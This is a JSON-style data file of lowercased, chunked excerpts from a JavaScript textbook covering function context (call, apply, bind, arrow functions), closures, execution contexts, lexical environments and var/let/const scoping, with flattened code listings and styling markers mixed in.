"javascript-4.2.4.txt__1": "4.2.4. invocation with the apply and call methods", "javascript-4.2.4.txt__2": "but what if we want to make the function context whatever we want? what if we want to set it explicitly? what if...well, why would we want to do such a thing?", "javascript-4.2.4.txt__3": "listing 4.10. binding a specific context to a function  <button id=\"test\">click me!</button>  #a  <script>  function button(){  #b  this.clicked = false;  this.click = function(){  #c  this.clicked = true;  assert(button.clicked, \"the button has been clicked\");  #d  };  var button = new button();  #e  var elem = document.getelementbyid(\"test\");  #f  elem.addeventlistener(\"click\", button.click);  #f  </script>  #a - a button element to which we'll assign an event handler  #b - a constructor function that creates objects that retain state regarding our button. with it, we'll track whether the button has been clicked.  #c - declares the method that we'll use as the click handler. because it's a method of the object, we use this within the function to get a reference to the object.  #d - within the method, we test that the button state has been correctly changed after a click.  #e - creates an instance that will track whether the button was clicked  #f - establishes the click handler on the button  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  in this example, we have a button, <button id=\"test\">click me!</button>, and we want to know whether it has ever been clicked. to retain that state information, we use a constructor function to create a backing object named button, in which we'll store the clicked state:  function button(){  this.clicked = false;  this.click = function(){  this.clicked = true;  assert(button.clicked, \"the button has been clicked\");  };  var button = new button();", "javascript-4.2.4.txt__4": "var elem = document.getelementbyid(\"test\");  elem.addeventlistener(\"click\", button.click);", "javascript-4.2.4.txt__5": "figure 4.2. why did our test fail? where did the change of state go? usually, the event callback's context is the object raising the event (in this case, the html button, and not the button object).", "javascript-4.2.4.txt__6": "this is a surprisingly common problem, and later in the chapter, you'll see techniques for completely evading it. for now, let's explore how to tackle it by examining how to explicitly set the function context by using the apply and call methods.  using the apply and call methods  javascript provides a means for us to invoke a function and to explicitly specify any object we want as the function context. we do this through the use of one of two methods that exist for every function: apply and call.  yes, we said methods of functions. as first-class objects (created, by the way, by the built-in function constructor), functions can have properties just like any other object type, including methods.", "javascript-4.2.4.txt__7": "the following listing shows both of these methods in action.  listing 4.11. using the apply and call methods to supply the function context  function juggle() {  #a  var result = 0;  #a  for (var n = 0; n < arguments.length; n++) {  #a  result += arguments[n];  #a  #a  this.result = result;  #a  #a  var ninja1 = {};  #b  var ninja2 = {};  #b  juggle.apply(ninja1,[1,2,3,4]);  #c  juggle.call(ninja2, 5,6,7,8);  #d  assert(ninja1.result === 10, \"juggled via apply\");  #e  assert(ninja2.result === 26, \"juggled via call\");  #e  #a - the function \u201cjuggles\u201d the arguments and puts the result onto whatever object is the function context.  #b - these objects are initially empty and will serve as our test subjects.  #c - uses the apply method, passing ninja1 and an array of arguments  #d - uses the call method, passing ninja2 and a list of arguments  #e - the tests show how the juggle result is placed on the objects passed to the methods.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-4.2.4.txt__8": "we then set up two objects, ninja1 and ninja2, that we'll use as function contexts, passing the first to the function's apply method, along with an array of arguments, and passing the second to the function's call method, along with a list of other arguments:  juggle.apply(ninja1,[1,2,3,4]);  juggle.call(ninja2, 5,6,7,8);  notice that the only difference between apply and call is how the arguments are supplied. in the case of apply, we use an array of arguments, and in the case of call, we list them as call arguments, after the function context. see figure 4.3.", "javascript-4.2.4.txt__9": "after we've supplied our function contexts and arguments, we continue by testing! first, we check that ninja1, which was called via apply, received a result property that's the result of adding up all the argument values (1, 2, 3, 4) in the passed array. then we do the same for ninja2, which was called via call, where we check the result for arguments 5, 6, 7, and 8:", "javascript-4.2.4.txt__10": "assert(ninja1.result === 10, \"juggled via apply\");  assert(ninja2.result === 26, \"juggled via call\");  figure 4.4 provides a closer look at what's going on in listing 4.11.  figure 4.4. manually setting a function context by using built-in call and apply from listing 4.11 results in these combinations of function contexts (the this parameter) and arguments.  these two methods, call and apply, can come in handy whenever it's expedient to usurp what would normally be the function context with an object of our own choosing\u2014something that can be particularly useful when invoking callback functions.  forcing the function context in callbacks  let's consider a concrete example of forcing the function context to be an object of our own choosing. we'll use a simple function to perform an operation on every entry of an array.  in imperative programming, it's common to pass the array to a method and use a for loop to iterate over every entry, performing the operation on each entry:  function(collection) {  for (var n = 0; n < collection.length; n++) {  /* do something to collection[n] */  in contrast, the functional approach is to create a function that operates on a single element and passes each entry to that function:  function(item){  /* do something to item */  the difference lies in thinking at a level where functions are the main building blocks of the program. you might think that it's moot, and that all you're doing is moving the for loop out one level, but we're not done massaging this example yet.", "javascript-4.2.4.txt__11": "even though all modern javascript engines now support a foreach method on arrays, we'll build our own (simplified) version of such a function in the next listing.  listing 4.12. building a foreach function to demonstrate setting a function context  function foreach(list, callback) {  #a  for (var n = 0; n < list.length; n++) {  callback.call(list[n], n);  #b  var weapons = [ { type: 'shuriken' },  { type: 'katana' },  { type:'nunchucks' }];  #c  foreach(weapons, function(index){  #d  assert(this === weapons[index],  #d  \"got the expected value of \" + weapons[index].type);  #d  });  #d  #a - our iteration function accepts the collection to be iterated over and a callback function.  #b - the callback is invoked such that the current iteration item is the function context.  #c - our test subject  #d - calls the iteration function and ensures that the function context is correct for each invocation of the callback  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  the iteration function sports a simple signature that expects the array of objects to be iterated over as the first argument, and a callback function as the second. the function iterates over the array entries, invoking the callback function for each entry:  function foreach(list,callback) {  for (var n = 0; n < list.length; n++) {  callback.call(list[n], n);  we use the call method of the callback function, passing the current iteration entry as the first parameter and the loop index as the second. this should cause the current entry to become the function context, and the index to be passed as the single parameter to the callback.  now to test that! we set up a simple weapons array. then we call the foreach function, passing the test array and a callback within which we test that the expected entry is set as the function context for each invocation of the callback:  foreach(weapons, function(index){  assert(this === weapons[index],  \"got the expected value of \" + weapons[index].type);  });  figure 4.5 shows that our function works splendidly.  figure 4.5. the test results show that we have the ability to make any object we please the function context of a callback invocation.", "javascript-4.2.4.txt__12": "given that apply and call do pretty much the same thing, here's something you might be asking yourself at this point: how do we decide which to use? the high-level answer is the same as for many such questions: we use whichever one improves code clarity. a more practical answer is to use the one that best matches the arguments we have handy. if we have a bunch of unrelated values in variables or specified as literals, call lets us list them directly in its argument list. but if we already have the argument values in an array, or if it's convenient to collect them as such, apply could be the better choice.", "javascript-4.2.txt__1": "4.2. invoking functions", "javascript-4.3.1.txt__1": "4.3.1. using arrow functions to get around function contexts", "javascript-4.3.1.txt__2": "listing 4.13. using arrow functions to work around callback function contexts  <button id=\"test\">click me!</button>  #a  <script>  function button(){  #b  this.clicked = false;  this.click = () => {  #c  this.clicked = true;  assert(button.clicked,\"the button has been clicked\");//  #d  };  var button = new button();  var elem = document.getelementbyid(\"test\");  #e  elem.addeventlistener(\"click\", button.click);  #e  </script>  #a - a button element to which we'll assign an event handler  #b - a constructor function that creates objects that retain state regarding our button. with it, we'll track whether the button has been clicked.  #c - declares the arrow function that we'll use as the click handler. because it's a method of the object, we use this within the function to get a reference to the object.  #d - within the method, we test that the button state has been correctly changed after a click.  #e - establishes the click handler on the button  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":4,\\\"ch\\\":17},{\\\"line\\\":4,\\\"ch\\\":22}]]\"}  !@%style%@!  the only change, when compared to listing 4.10, is that listing 4.13 uses an arrow function:  this.click = () = > {  this.clicked = true;  assert(button.clicked, \"the button has been clicked\");  };  now, if we run the code, we'll get the output shown in figure 4.6.  figure 4.6. arrow functions don't have their own context. instead, the context is inherited from the function in which they're defined. the this parameter in our arrow function callback refers to the button object.  as you can see, all is well now. the button object keeps track of the clicked state. what happened is that our click handler was created inside the button constructor as an arrow function:  function button(){  this.clicked = false;  this.click = () => {  this.clicked = true;  assert(button.clicked, \"the button has been clicked\");  };", "javascript-4.3.1.txt__3": "caveat: arrow functions and object literals", "javascript-4.3.1.txt__4": "listing 4.14. arrow functions and object literals  <button id=\"test\">click me!</button>  <script>  assert(this === window, \"this === window\");  #a  var button = {  #b  clicked: false,  click: () => {  #c  this.clicked = true;  assert(button.clicked,\"the button has been clicked\");  #d  assert(this === window, \"in arrow function this === window\");  #e  assert(window.clicked, \"clicked is stored in window\");  #f  var elem = document.getelementbyid(\"test\");  elem.addeventlistener(\"click\", button.click);  </script>  #a - the value of the this parameter in global code is the global window object.  #b - the button object is defined as an object literal.  #c - our arrow function is a property of an object literal.  #d - test whether the button was clicked.  #e - the value of this in our arrow function is the global window object.  #f - clicked is stored on window.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  if we run listing 4.14, we'll again be disappointed, because the button object has once more failed to track the clicked state. see figure 4.7.  figure 4.7. if an arrow function is defined within an object literal that's defined in global code, the value of the this parameter associated with the arrow function is the global window object.  luckily, we've scattered a couple of assertions throughout our code that will help. for example, we've placed the following directly in global code, in order to check the value of the this parameter:  assert(this === window, \"this === window\");  because the assertion passes, we can be sure that in global code this refers to the global window object.  we follow this by specifying that the button object literal has a click arrow function property:  var button = {  clicked: false,  click: () => {  this.clicked = true;  assert(button.clicked,\"the button has been clicked\");  assert(this === window, \"in arrow function this === window\");  assert(window.clicked, \"clicked is stored in window\");  };", "javascript-4.3.2.txt__1": "4.3.2. using the bind method  in this chapter, you've already met two methods that every function has access to, call and apply, and you've seen how to use them for greater control over the context and arguments of our function invocations.  in addition to these methods, every function has access to the bind method that, in short, creates a new function. this function has the same body, but its context is always bound to a certain object, regardless of the way we invoke it.  let's revisit our little problem with button-click handlers one last time.  listing 4.15. binding a specific context to an event handler  <button id=\"test\">click me!</button>  <script>  var button = {  clicked: false,  click: function(){  this.clicked = true;  assert(button.clicked,\"the button has been clicked\");  };  var elem = document.getelementbyid(\"test\");  elem.addeventlistener(\"click\", button.click.bind(button));  #a  var boundfunction = button.click.bind(button);  assert(boundfunction != button.click,  \"calling bind creates a completly new function\");  </script>  #a - uses the bind function to create a new function bound to the button object  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":10,\\\"ch\\\":33},{\\\"line\\\":10,\\\"ch\\\":58}],[{\\\"line\\\":12,\\\"ch\\\":22},{\\\"line\\\":12,\\\"ch\\\":47}],[{\\\"line\\\":17,\\\"ch\\\":0},{\\\"line\\\":17,\\\"ch\\\":79}]]\"}  !@%style%@!  the secret sauce added here is the bind() method:  elem.addeventlistener(\"click\", button.click.bind(button));", "javascript-4.3.txt__1": "4.3. fixing the problem of function contexts", "javascript-4.4.txt__1": "4.4. summary  when invoking a function, in addition to the parameters explicitly stated in the function definition, function invocations are passed in two implicit parameters: arguments and this:", "javascript-5.1.txt__1": "5.1. understanding closures  a closure allows a function to access and manipulate variables that are external to that function. closures allow a function to access all the variables, as well as other functions, that are in scope when the function itself is defined.  note  you're probably familiar with the concept of scopes, but just in case, a scope refers to the visibility of identifiers in certain parts of a program. a scope is a part of the program in which a certain name is bound to a certain variable.", "javascript-5.1.txt__2": "listing 5.1. a simple closure  var outervalue = \"ninja\";  #a  function outerfunction(){  assert(outervalue === \"ninja\",\"i can see the ninja.\");  #b  outerfunction();  #c  #a - defines a value in global scope  #b - declares a function in global scope  #c - executes the function  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":0,\\\"ch\\\":6},{\\\"line\\\":0,\\\"ch\\\":16}],[{\\\"line\\\":2,\\\"ch\\\":11},{\\\"line\\\":2,\\\"ch\\\":21}]]\"}  !@%style%@!  in this code example, we declare a variable outervalue and a function outerfunction in the same scope\u2014in this case, the global scope. afterward, we call outerfunction.  as you can see in figure 5.1, the function is able to \u201csee\u201d and access the outervalue variable. you've likely written code such as this hundreds of times without realizing that you were creating a closure!  figure 5.1. our function has found the ninja, who was hiding in plain sight.", "javascript-5.1.txt__3": "even though the closure exists, its benefits aren't yet clear. let's spice it up in the next listing.  listing 5.2. another closure example  var outervalue = \"samurai\";  var later;  #a  function outerfunction(){  var innervalue = \"ninja\";  #b  function innerfunction(){  #c  assert(outervalue === \"samurai\", \"i can see the samurai.\"); #c  assert(innervalue === \"ninja\", \"i can see the ninja.\")  #c  #c  later = innerfunction;  #d  outerfunction();  #e  later();  #f  #a - an empty variable that we'll use later  #b - declares a value inside the function. this variable's scope is limited to the function and can't be accessed from outside the function.  #c - declares an inner function within the outerfunction. innervalue is in scope when we create this function.  #d - stores a reference to innerfunction in the later variable. because later is in the global scope, it'll allow us to call the function later.  #e - invokes outerfunction, which causes innerfunction to be created and its reference assigned to later  #f - invokes innerfunction through later. we can't invoke it directly because its scope (along with innervalue) is limited to within outerfunction.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  let's overanalyze the code in innerfunction and see whether we can predict what might happen:  the first assert is certain to pass; outervalue is in the global scope and is visible to everything. but what about the second assert?  we're executing innerfunction after outerfunction has been executed via the trick of copying a reference to the function to the global variable later.  when innerfunction executes, the scope inside the outer function is long gone and not visible at the point at which we're invoking the function through later.  so we could very well expect assert to fail, as innervalue is sure to be undefined. right?  but when we run the test, we see the display in figure 5.2.  figure 5.2. despite trying to hide inside a function, the ninja has been detected!  how can that be? what magic allows the innervalue variable to still be \u201calive\u201d when we execute the inner function, long after the scope in which it was created has gone away? the answer is closures.", "javascript-5.1.txt__4": "figure 5.3. like a protective bubble, the closure for innerfunction keeps the variables in the function's scope alive for as long as the function exists.", "javascript-5.1.txt__5": "although all this structure isn't readily visible (there's no \u201cclosure\u201d object holding all of this information that you can inspect), storing and referencing information in this way has a direct cost. it's important to remember that each function that accesses information via a closure has a \u201cball and chain\u201d attached to it, carrying this information around. so although closures are incredibly useful, they aren't free of overhead. all that information needs to be held in memory until it's absolutely clear to the javascript engine that it's no longer needed (and is safe to garbage-collect), or until the page unloads.", "javascript-5.2.1.txt__1": "5.2.1. mimicking private variables", "javascript-5.2.1.txt__2": "listing 5.3. using closures to approximate private variables  function ninja() {  #a  var feints = 0;  #b  this.getfeints = function(){  #c  return feints;  #c  };  #c  this.feint = function(){  #d  feints++;  #d  };  #d  var ninja1 = new ninja();  #e  ninja1.feint();  #f  assert(ninja1.feints === undefined,  #g  \"and the private data is inaccessible to us.\");  #g  assert(ninja1.getfeints()=== 1,  #h  \"we're able to access the internal feint count.\");  #h  var ninja2 = new ninja();  #i  assert(ninja2.getfeints()=== 0,  #i  \"the second ninja object gets its own feints variable.\"); #i  #a - defines the constructor for a ninja  #b - declares a variable inside the constructor function. because the scope of the variable is limited to inside the constructor, it's a \u201cprivate\u201d variable. we'll use it to count how many times the ninja has feinted.  #c - creates an accessor method for the feints counter. because the variable isn't accessible to code outside the constructor, this is a common way to give read-only access to the value.  #d - declares the increment method for the value. because the value is private, no one can screw it up behind our backs; they're limited to the access that we give them via methods.  #e - now for testing\u2014first we construct an instance of ninja.  #f - calls the feint method, which increments the count of the number of times that our ninja has feinted  #g - verifies that we can't get at the variable directly  #h - we were able to change the \"private\" variable, even though we had no direct access to it.  #i - when we create a new ninja2 object with the ninja constructor, the ninja2 object gets its own feints variable.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-5.2.1.txt__3": "within the constructor, we define a variable to hold state, feints. the javascript scoping rules for this variable limit its accessibility to within the constructor. to give access to the value of the variable from code that's outside the scope, we define an accessor method: getfeints, which can be used to read the private variable. (accessor methods are frequently called getters.)", "javascript-5.2.1.txt__4": "function ninja() {  var feints = 0;  this.getfeints = function(){  return feints;  };  this.feint = function(){  feints++;  };  an implementation method, feint, is then created to give us control over the value of the variable. in a real-world application, this might be a business method, but in this example, it merely increments the value of feints.  after the constructor has done its duty, we can call the feint method on the newly created ninja1 object:  var ninja1 = new ninja();  ninja1.feint();", "javascript-5.2.2.txt__1": "5.2.2. using closures with callbacks  another common use of closures occurs when dealing with callbacks\u2014when a function is called at an unspecified later time. often, within such functions, we frequently need to access outside data. the following listing shows an example that creates a simple animation with callback timers.  listing 5.4. using a closure in a timer interval callback  <div id=\"box1\">first box</div>  #a  <script>  function animateit(elementid) {  var elem = document.getelementbyid(elementid);  #b  var tick = 0;  #c  var timer = setinterval(function(){  #d  if (tick < 100) {  #e  elem.style.left = elem.style.top = tick + \"px\";  #e  tick++;  #e  #e  else {  clearinterval(timer);  assert(tick === 100,  #f  \"tick accessed via a closure.\");  assert(elem,  \"element also accessed via a closure.\");  assert(timer,  \"timer reference also obtained via a closure.\" );  }, 10);  #g  animateit(\"box1\");  #h  </script>  #a - creates the element that we're going to animate  #b - inside the animateit function, we get a reference to that element.  #c - establishes a counter to keep track of animation ticks (steps)  #d - a built-in function that creates and starts an interval timer, given a callback  #e - the timer callback is invoked every 10 milliseconds. for 100 ticks, it adjusts the position of the element.  #f - after 100 ticks, we stop the timer and perform tests to assert that we can see all relevant variables needed to perform the animation.  #g - the setinterval duration\u2014the callback will be called every 10ms.  #h - now that it's all set up, we set it in motion!  !@%style%@!", "javascript-5.2.2.txt__2": "!@%style%@!", "javascript-5.2.2.txt__3": "but the example will still work fine if we move the variables out of the animateit function and into the global scope. so why all the arm flailing about not polluting the global scope?  go ahead and move the variables into the global scope and verify that the example still works. now modify the example to animate two elements: add another element with a unique id, and call the animateit function with that id right after the original call.  the problem immediately becomes obvious. if we keep the variables in the global scope, we need a set of three variables for each animation. otherwise, they'll step all over each other, trying to use the same set of variables to keep track of multiple states.  by defining the variables inside the function, and by relying on closures to make them available to the timer callback invocations, each animation gets its own private \u201cbubble\u201d of variables, as shown in figure 5.5.  figure 5.5. by keeping the variables for multiple instances of the function separate, we can do many things at once.  without closures, doing multiple things at once, whether event handling, animations, or even server requests, would be incredibly difficult. if you've been waiting for a reason to care about closures, this is it!  this example is a particularly good one for demonstrating how closures are capable of producing some surprisingly intuitive and concise code. by including the variables in the animateit function, we create an implied closure without needing any complex syntax.", "javascript-5.3.txt__1": "5.3. tracking code execution with execution contexts", "javascript-5.3.txt__2": "as we mentioned in chapter 2, there are two main types of javascript code: global code, placed outside all functions, and function code, contained in functions. when our code is being executed by the javascript engine, each statement is executed in a certain execution context.", "javascript-5.3.txt__3": "note", "javascript-5.3.txt__4": "as we mentioned in chapter 2, javascript is based on a single-threaded execution model: only one piece of code can be executed at a time. every time a function is invoked, the current execution context has to be stopped, and a new function execution context, in which the function code will be evaluated, has to be created. after the function performs its task, its function execution context is usually discarded, and the caller execution context restored. so there's a need to keep track of all these execution contexts\u2014both the one that's executing and the ones that are patiently waiting. the easiest way to do this is by using a stack, called the execution context stack (or often called a call stack).", "javascript-5.3.txt__5": "note", "javascript-5.3.txt__6": "this might seem vague, so let's look at the following code, which reports the activity of two skulking ninjas.  listing 5.5. the creation of execution contexts  function skulk(ninja) {  #a  report(ninja + \" skulking\");  #a  #a  function report(message) {  #b  console.log(message);  #b  #b  skulk(\"kuma\");  #c  skulk(\"yoshi\");  #c  #a - a function that calls another function  #b - a function that reports a message through the built-in console.log function  #c - two function calls from global code  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-5.3.txt__7": "figure 5.6. the behavior of the execution context stack  when executing the example code, the execution context behaves as follows:  the execution context stack starts with the global execution context that's created only once per javascript program (once per page in the case of web pages). the global execution context is the active execution context when executing global code.", "javascript-5.3.txt__8": "the skulk function, in turn, calls the report function with the argument kuma skulking. again, because only one piece of code can be executed at a time, the skulk execution context is paused, and a new function execution context for the report function, with the argument kuma skulking, is created and pushed onto the stack.", "javascript-5.3.txt__9": "after the report function logs the message by using the built-in console.log function (see appendix c) and finishes its execution, we have to go back to the skulk function. this is done by popping the report function execution context from the stack. the skulk function execution context is then reactivated, and the execution of the skulk function continues.", "javascript-5.3.txt__10": "a similar thing happens when the skulk function finishes its execution: the function execution context of the skulk function is removed from the stack, and the global execution context, which has been patiently waiting this whole time, is restored as the active execution context. the execution of global javascript code is restored.", "javascript-5.3.txt__11": "this whole process is repeated in a similar way for the second call to the skulk function, now with the argument yoshi. two new function execution contexts are created and pushed to the stack, skulk(\"yoshi\") and report(\"yoshi skulking\"), when the respective functions are called. these execution contexts are also popped off the stack when the program returns from the matching function.", "javascript-5.4.1.txt__1": "5.4.1. code nesting  lexical environments are heavily based on code nesting, which enables one code structure to be contained within another. figure 5.8 shows various types of code nesting.  figure 5.8. types of code nesting  in this example, we can see the following:  the for loop is nested within the report function.  the report function is nested within the skulk function.  the skulk function is nested within global code.  in terms of scopes, each of these code structures gets an associated lexical environment every time the code is evaluated. for example, on every invocation of the skulk function, a new function lexical environment is created.", "javascript-5.4.2.txt__1": "5.4.2. code nesting and lexical environments", "javascript-5.4.2.txt__2": "figure 5.9. how javascript engines resolve the values of variables", "javascript-5.4.2.txt__3": "in a particular execution context, besides accessing identifiers defined directly in the matching lexical environment, our programs often access other variables defined in outer environments. for example, in the body of the report function, we access the variable action of the outer skulk function, as well as the global ninja variable. to do this, we have to somehow keep track of these outer environments. javascript does this by taking advantage of functions as first-class objects.", "javascript-5.4.2.txt__4": "whenever a function is created, a reference to the lexical environment in which the function was created is stored in an internal (meaning that you can't access or manipulate it directly) property named [[environment]]; double brackets is the notation that we'll use to mark these internal properties. in our case, the skulk function will keep a reference to the global environment, and the report function will keep a reference to the skulk environment, because these were the environments in which the functions were created.", "javascript-5.4.2.txt__5": "note", "javascript-5.4.2.txt__6": "whenever a function is called, a new function execution context is created and pushed onto the execution context stack. in addition, a new associated lexical environment is created. now comes the crucial part: for the outer environment of the newly created lexical environment, the javascript engine puts the environment referenced by the called function's internal [[environment]] property, the environment in which the now-called function was created!", "javascript-5.4.2.txt__7": "in our case, when the skulk function is called, the outer environment of the newly created skulk environment becomes the global environment (because it's the environment in which the skulk function was created). similarly, when calling the report function, the outer environment of the newly created report environment is set to the skulk environment.", "javascript-5.4.2.txt__8": "now let's take a look at the report function:  function report() {  var intro = \"aha!\";  assert(intro === \"aha!\", \"local\");  assert(action === \"skulking\", \"outer\");  assert(action === \"muneyoshi\", \"global\");", "javascript-5.4.2.txt__9": "next, the second assert statement has to resolve the action identifier. again, the environment of the currently running execution context is checked. but the report environment doesn't contain a reference to the action identifier, so the javascript engine has to check the outer environment of the report environment: the skulk environment. luckily, the skulk environment contains a reference to the action identifier, and the identifier is resolved. a similar process is followed when trying to resolve the ninja identifier (a little hint: the identifier can be found in the global environment).", "javascript-5.4.txt__1": "5.4. keeping track of identifiers with lexical environments  a lexical environment is an internal javascript engine construct used to keep track of the mapping from identifiers to specific variables. for example, consider the following code:  var ninja = \"hattori\";  console.log(ninja);  the lexical environment is consulted when the ninja variable is accessed in the console.log statement.  note  lexical environments are an internal implementation of the javascript scoping mechanism, and people often colloquially refer to them as scopes.  usually, a lexical environment is associated with a specific structure of javascript code. it can be associated with a function, a block of code, or the catch part of a try-catch statement. each of these structures (functions, blocks, and catch parts) can have its own separate identifier mappings.  note", "javascript-5.5.1.txt__1": "5.5.1. variable mutability", "javascript-5.5.1.txt__2": "now, let's delve into how const variables work and behave.  const variables  a const \u201cvariable\u201d is similar to a normal variable, with the exception that we have to provide an initialization value when it's declared, and we can't assign a completely new value to it afterward. hmmm, not very variable, is it?  const variables are often used for two slightly different purposes:  specifying variables that shouldn't be reassigned (and in the rest of the book, we use them mostly in this regard).", "javascript-5.5.1.txt__3": "in either case, because const variables aren't meant to be reassigned during program execution, we've safeguarded our code against unwanted or accidental modifications and we've even made it possible for the javascript engine to do some performance optimizations.  the following listing illustrates the behavior of const variables.  listing 5.6. the behavior of const variables  const firstconst = \"samurai\";  #a  assert(firstconst === \"samurai\", \"firstconst is a samurai\");  #a  try{  #b  firstconst = \"ninja\";  #b  fail(\"shouldn't be here\");  #b  } catch(e){  #b  pass(\"an exception has occurred\");  #b  #b  #b  assert(firstconst === \"samurai\",  #b  \"firstconst is still a samurai!\");  #b  const secondconst = {};  #c  secondconst.weapon = \"wakizashi\";  #d  assert(secondconst.weapon === \"wakizashi\",  #d  \"we can add new properties\");  #d  const thirdconst = [];  #e  assert(thirdconst.length === 0, \"no items in our array\");  #e  #e  thirdconst.push(\"yoshi\");  #e  #e  assert(thirdconst.length === 1, \"the array has changed\");  #e  #a - defines a const variable and verifies that the value was assigned  #b - attempting to assign a new value to a const variable throws an exception.  #c - creates a new const variable and assigns a new object to it  #d - we can't assign a completely new object to the secondconst variable, but there's nothing stopping us from modifying the one we already have.  #e - the exact same thing holds for arrays.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  here we first define a const variable named firstconst with a value samurai and test that the variable has been initialized, as expected:  const firstconst = \"samurai\";  assert(firstconst === \"samurai\", \"firstconst is a samurai\");  we continue by trying to assign a completely new value, ninja, to our firstconst variable:  try{  firstconst = \"ninja\";  fail(\"shouldn't be here\");  } catch(e){  pass(\"an exception has occurred\");", "javascript-5.5.1.txt__4": "figure 5.10. checking the behavior of const variables. an exception occurs when we try to assign a completely new value to a const variable.  next, we define another const variable, this time initializing it to an empty object:  const secondconst = {};  now we'll discuss an important feature of const variables. as you've already seen, we can't assign a completely new value to a const variable. but there's nothing stopping us from modifying the current one. for example, we can add new properites to the current object:  secondconst.weapon = \"wakizashi\";  assert(secondconst.weapon === \"wakizashi\",  \"we can add new properties\");  or, if our const variable refers to an array, we can modify that array to any degree:  const thirdconst = [];  assert(thirdconst.length === 0, \"no items in our array\");  thirdconst.push(\"yoshi\");  assert(thirdconst.length === 1, \"the array has changed\");", "javascript-5.5.2.txt__1": "5.5.2. variable definition keywords and lexical environments  the three types of variable definitions\u2014var, let, and const\u2014can also be categorized by their relationship with the lexical environment (in other words, by their scope). in that case, we can put var on one side, and let and const on the other.  using the var keyword  when we use the var keyword, the variable is defined in the closest function or global lexical environment. (note that blocks are ignored!) this is a long-standing detail of javascript that has tripped up many developers coming from other languages.  consider the following listing.  listing 5.7. using the var keyword  var globalninja = \"yoshi\";  #a  function reportactivity(){  var functionactivity = \"jumping\";  #b  for(var i = 1; i < 3; i++) {  #c  var formessage = globalninja + \" \" + functionactivity;  #c  assert(formessage === \"yoshi jumping\",  #d  \"yoshi is jumping within the for block\");  #d  assert(i, \"current loop counter:\" + i);  assert(i === 3 && formessage === \"yoshi jumping\",  #e  \"loop variables accessible outside of the loop\");  #e  reportactivity();  assert(typeof functionactivity === \"undefined\"  #f  && typeof i === \"undefined\" && typeof formessage === \"undefined\",  #f  \"we cannot see function variables outside of a function\");  #f  #a - defines a global variable, using var  #b - defines a function local variable, using var  #c - defines two variables in the for loop, using var  #d - within the for loop, we can access the block variables, function variables, and global variables\u2014nothing surprising there.  #e - but the variables of the for loop are also accessible outside the for loop.  #f - normally, none of the function variables are accessible outside of the function.  !@%style%@!", "javascript-5.5.2.txt__2": "!@%style%@!", "javascript-5.5.2.txt__3": "but what's strange with javascript, and what confuses a lot of developers coming from other languages, is that we can access the variables defined with code blocks even outside those blocks:  assert(i === 3 && formessage === \"yoshi jumping\",  \"loop variables accessible outside of the loop\");", "javascript-5.5.2.txt__4": "figure 5.11. when defining variables with the keyword var, a variable is defined in the closest function or global environment (while ignoring block environments). in our case, the variables formessage and i are registered in the reportactivity environment (the closest functional environment), even though they're contained within a for loop.", "javascript-5.5.2.txt__5": "here we have three lexical environments:  the global environment in which the globalninja variable is registered (because this is the closest function or global lexical environment)  the reportactivity environment, created on the reportactivity function invocation, which contains the functionactivity, i, and formessage variables, because they're defined with the keyword var, and this is their closest function environment  the for block environment, which is empty, because var-defined variables ignore blocks (even when contained within them)  because this behavior is a bit strange, the es6 version of javascript offers two new variable declaration keywords: let and const.  using let and const to specify block-scoped variables", "javascript-5.5.2.txt__6": "let's rewrite our previous example to use const and let.  listing 5.8. using const and let keywords  const global_ninja = \"yoshi\";  #a  function reportactivity(){  const functionactivity = \"jumping\";  #b  for(let i = 1; i < 3; i++) {  #c  let formessage = global_ninja + \" \" + functionactivity;  #c  assert(formessage === \"yoshi jumping\",  #d  \"yoshi is jumping within the for block\");  #d  assert(i, \"current loop counter:\" + i);  #d  assert(typeof i === \"undefined\" && typeof formessage === \"undefined\", #e  \"loop variables not accessible outside the loop\");  #e  reportactivity();  assert(typeof functionactivity === \"undefined\"  #f  && typeof i === \"undefined\" && typeof formessage === \"undefined\", #f  \"we cannot see function variables outside of a function\");  #f  #a - defines a global variable, using const. global const variables are usually written in uppercase.  #b - defines a function local variable, using const  #c - defines two variables in the for loop, using let  #d - within the for loop, we can access the block variables, function variables, and global variables\u2014nothing surprising there.  #e - now, the variables of the for loop aren't accessible outside the for loop.  #f - normally, none of the function variables are accessible outside the function.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":0,\\\"ch\\\":0},{\\\"line\\\":0,\\\"ch\\\":29}]]\"}  !@%style%@!", "javascript-5.5.2.txt__7": "figure 5.12. when defining variables with keywords let and const, a variable is defined in the closest environment. in our case, variables formessage and i are registered in the for block environment, the variable functionactivity in the reportactivity environment, and the global_ninja variable in the global environment (in every case, the closest environment to the respective variable).", "javascript-5.5.2.txt__8": "now that const and let have been introduced, scores of new javascript developers who have recently come from other programming languages can be at peace. javascript finally supports the same scoping rules as other c-like languages. for this reason, from this point in this book, we almost always use const and let instead of var.", "javascript-5.5.2.txt__9": "now that we understand how identifier mappings are kept within lexical environments and how lexical environments are linked to program execution, let's discuss the exact process by which identifiers are defined within lexical environments. this will help us better understand some commonly occurring bugs.", "javascript-5.5.3.txt__1": "5.5.3. registering identifiers within lexical environments", "javascript-5.5.3.txt__2": "firstronin = 